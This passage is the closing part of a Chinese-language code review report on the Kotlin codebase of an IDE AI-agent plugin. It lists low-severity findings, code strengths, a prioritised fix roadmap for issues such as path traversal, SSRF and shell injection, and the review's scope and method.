`val dataUrl = obj["dataUrl"]?.jsonPrimitive?.content ?: return@mapNotNull null` 100MB 的 base64 图片会全部送入 LLM context。

### M24. `BoundedConcurrentMap.get()` 改访问顺序，但 `computeIfAbsent` 路径未改
**文件**: `src/main/kotlin/com/codesage/agent/core/BoundedConcurrentMap.kt`

`AgentErrorRecovery.retryCounters.computeIfAbsent` 的频繁调用不会更新 LRU，但会刷新 value；这导致 LRU 的"最少使用"判定不准确。

---

## 🟢 LOW / 建议项

### L1. `Logger.kt` 的 `SafeLogger` 注释是双 KDoc
**文件**: `src/main/kotlin/com/codesage/shared/utils/Logger.kt:65-83`

两段几乎相同的注释，应合并。

### L2. 大量 `// TODO` 散落代码
**文件**: `JCEFChatPanel.kt:323` `regenerate` TODO、`createFileFromArtifact` 空实现、多个 handler 占位符。

### L3. `T7.2 修复` 等历史注释应清理
**文件**: 多处

`T0.1–T0.7` 系列修复注释详细但堆叠，新读者难以分辨"当前行为 vs 历史原因"。建议迁到 `CHANGELOG.md` 或 `git log`。

### L4. `extractFacts` 的正则匹配可匹配到中文括号
**文件**: `BuiltInMemoryProvider.kt:614-640`

`Regex("""(?i)(?:决定|选择|采用|使用)\s+(.{0,50})""")` 可能匹配到 `}` 或半截中文标点。

### L5. `OpenAICompatibleAdapter` 的 129 行 DTO 重复定义
**文件**: `src/main/kotlin/com/codesage/model/adapter/OpenAICompatibleAdapter.kt:230-300`

`VendorMessage`、`VendorTool` 等 DTO 与 `Message`、`Tool` 高度重复，可考虑 `kotlinx.serialization` 的 `JsonClassDiscriminator` 减少样板。

### L6. `JCEFChatPanel.parseImages` 对未声明的 mime 不限制
**文件**: `JCEFChatPanel.kt:471`

`mime = obj["mime"]?.jsonPrimitive?.content ?: "image/png"` — `text/html` mime 也接受。

### L7. `MarkdownRenderer` 渲染代码块未做尺寸限制
**文件**: `src/main/kotlin/com/codesage/ide/ui/components/chat/MarkdownRenderer.kt`

长代码块（>10k 行）会让 UI 卡死。

### L8. `DatabaseSchemaTool` 是 stub，但 description 说"列出表和列"
**文件**: `HighValueTools.kt:212-230`

UI 端会展示完整能力，运行时却返回空表 — 误导。

### L9. `CodeInsightTools` 仍保留 legacy 注册路径
**文件**: `ToolRegistry.kt:140`

`CodeInsightTools.getAllTools().forEach { register(it) }` 与 `UnifiedTool` 版本（T6.1 修复后）共存，可能导致 schema 重复。

### L10. `EventRouter` 注释里声明的 handler 实际未注册
**文件**: `EventRouter.kt:33-39`

`Event` 类（如 `SessionMigrated`）的 `handler` 返回的 map 与 JS 端实际协议格式不一一对应（字段命名 camelCase vs snake_case）。

### L11. `AgentHooks.onTurnStart` 等回调没有异常隔离
**文件**: `src/main/kotlin/com/codesage/agent/core/AgentHooks.kt:32-48`

如果 hook 实现抛异常，会中断主循环；建议每个 hook 独立 try-catch。

### L12. `mcp_server` 启动时通过 `scope.launch` 异步连接，没有超时
**文件**: `CodeSageAppService.kt:160-194`

如果某个 MCP server 卡住 connect 阶段（10 分钟），整个 app service init 仍在"已初始化"状态。

### L13. `Json` 实例在多处分别创建，未做共享
**文件**: 多处

`private val json = Json { ignoreUnknownKeys = true }` 重复 20+ 次，应统一在 `SharedJson` 单例里。

---

## ✅ 代码亮点

1. **整体架构清晰**: AgentCore → EnhancedAgentLoop → ToolExecutor → ToolHandler 分层良好。
2. **密封类 + 状态机**: `AgentState`、`RecoveryAction`、`ConversationPhase` 完整覆盖状态空间。
3. **线程安全有意识**: `ConcurrentHashMap`、`AtomicReference`、`BoundedConcurrentMap` 在关键路径都用上。
4. **错误恢复丰富**: 13 种 `FailoverReason` + 5 种 `RecoveryAction`，分级处理细致。
5. **可观测性强**: `ExecutionTracer`、`MetricsCollector`、`StructuredLogger` 三件套，且有 guardrail audit log。
6. **工具注册现代化**: `ToolRegistry` + `UnifiedTool` + `FunctionalToolHandler` 抽象层次分明。
7. **敏感操作策略**: `SensitiveActionPolicy` 的 token 化命令匹配比单纯字符串 contains 安全。
8. **原子写**: `ConversationPersistence` / `SettingsRepository` 都用 tmp + rename 防止半写。
9. **API Key 隔离**: PasswordSafe 单独存储，不进 settings.json。
10. **子 Agent 递归限制**: `MAX_RECURSION_DEPTH = 2` 防止无限 spawn。

---

## 🎯 优先修复路线图

### 立即修复（Critical，C 编号）
1. C4 路径穿越 — `SensitiveActionPolicy` 改用 `Path.startsWith`
2. C5 SSRF — 改用 `InetAddress` 解析 + 双向检查
3. C6 shell 注入 — `run_command` 改 `ProcessBuilder` 数组参数
4. C7 JCEF JSON 注入 — 改用 `JSON.parse` 而不是字符串拼接

### 本周修复（High，H 编号）
5. H1 memory prefetch 大小限制
6. H8 parseToolSuccess 布尔解析修正
7. H10 ToolExecutor 重试策略
8. H16 applyArtifactToEditor 限制
9. H17 exportToHtml XSS

### 下迭代（Medium，M 编号）
10. M9 agentScope 异常吞没 — 加 `CoroutineExceptionHandler`
11. M23 parseImages 尺寸限制
12. M22 PluginConfig loadState 日志分级

### 重构项（Low，L 编号）
13. L5 共享 `Json` 实例
14. L3 清理历史注释
15. L11 Hook 异常隔离

---

## 📝 附录

### 审查范围
- 核心模块: `agent/core`, `agent/memory`, `agent/tools`, `agent/context`, `agent/multiagent`, `agent/planner`
- 模型层: `model/adapter`, `model/registry`, `model/gateway`
- MCP 集成: `mcp/client`, `mcp/server`, `mcp/transport`, `mcp/marketplace`
- 持久化: `persistence`
- 工具防护: `tools/guardrails`
- IDE 集成: `ide/ui/web`, `ide/ui/components`, `ide/ui/web/*BridgeHandler.kt`, `ide/inline/*`
- 配置: `shared/config/*`
- 性能: `perf`, `prompt/cache`, `prompt/engine`
- 观测: `observability`

### 审查方法
- 全量阅读 70+ 个核心 Kotlin 源文件（合计约 17,000 行）
- 重点关注：文件操作、shell 调用、网络请求、SQL 操作、JS Bridge 边界、线程同步、敏感数据流向
- 风险优先级：可被 prompt injection 利用的路径 > 资源泄漏 > 性能瓶颈 > 代码风格

### 已知未覆盖区域
- `webui/` 下的前端 JS / TypeScript 未审查（项目主要逻辑是 Kotlin 后端）
- `src/test/` 测试代码质量未审查
- i18n / 字符串资源未审查
- 性能基准（JMH 级别）未做

### 与上一份 review 的关系
`docs/CODE_REVIEW_REPORT.md`（2026-01-19）记录了 47 个问题。本次审查发现的 C1-C8 / H1-H17 中：
- 已修复（KDoc 注释标注 T0.x）：并发会话管理、EventBatchEmitter shutdown、in-flight 跟踪、renameTo 错误处理、WebSocketTransport 实现、会话历史分页。
- 新引入或回归的：C4/C5/C6（安全策略实现细节）、C7（JS Bridge）、C8（CAS 循环）。
- 未在旧报告里的新功能区：`MCP transport`、`SubAgent`、`CodeInsightUnifiedTools`、新版 `SettingsRepository` 等，本次发现的问题主要来自这些区域。

